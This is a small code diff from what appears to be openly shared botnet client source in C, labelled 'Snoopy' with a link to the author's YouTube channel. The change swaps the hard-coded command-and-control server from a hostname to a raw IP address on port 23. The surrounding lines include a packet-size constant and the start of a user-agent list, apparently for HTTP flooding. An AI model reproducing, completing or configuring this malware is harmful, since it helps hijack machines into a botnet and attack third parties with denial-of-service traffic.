@@ -26,7 +26,7 @@
 #define std_packet 1460
 //RYRDM9 Snoopy. source
 //My Yt: https://www.youtube.com/channel/UCvLoqmjjvRTGi-bGnX5rvaw?view_as=subscriber
-unsigned char *commServer[] = {"segfault.net:23"};
+unsigned char *commServer[] = {"100.126.224.27:23"};
 
 const char *useragents[] = {
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
